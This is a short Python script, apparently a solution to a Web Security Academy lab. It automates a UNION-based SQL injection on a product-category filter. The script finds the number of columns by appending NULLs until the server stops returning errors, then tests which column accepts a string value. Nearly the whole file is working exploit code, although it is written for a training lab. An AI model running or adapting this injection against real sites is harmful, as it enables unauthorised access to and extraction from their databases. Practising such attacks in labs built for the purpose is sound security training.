# usage:
# python3 4.py \
# --u https://0aaa00a7037819be80f76c960063008a.web-security-academy.net

import re
from argparse import ArgumentParser

import requests


class Solution:
    def __init__(self, url: str) -> None:
        self.url = url.rstrip("/")

    def solve(self) -> None:
        s = requests.Session()
        r = s.get(f"{self.url}")
        token = re.findall(r"string: \'(\w+)\'", r.text)[0]

        i = 1
        r = s.get(f"{self.url}/filter?category=Accessories'+UNION+SELECT+NULL--")
        while r.status_code == 500:
            i += 1
            nulls = ["NULL"] * i
            r = s.get(
                f"{self.url}/filter?category=Accessories'+UNION+SELECT+{','.join(nulls)}--"
            )

        for j in range(i):
            nulls = ["NULL"] * i
            nulls[j] = f"'{token}'"
            r = s.get(
                f"{self.url}/filter?category=Accessories'+UNION+SELECT+{','.join(nulls)}--"
            )
            if r.status_code != 500:
                print(f"Column {j + 1} accepts string values")
                break


def main():
    parser = ArgumentParser()
    parser.add_argument("--u", "--url", dest="url")
    args = parser.parse_args()
    s = Solution(args.url)
    s.solve()


if __name__ == "__main__":
    main()
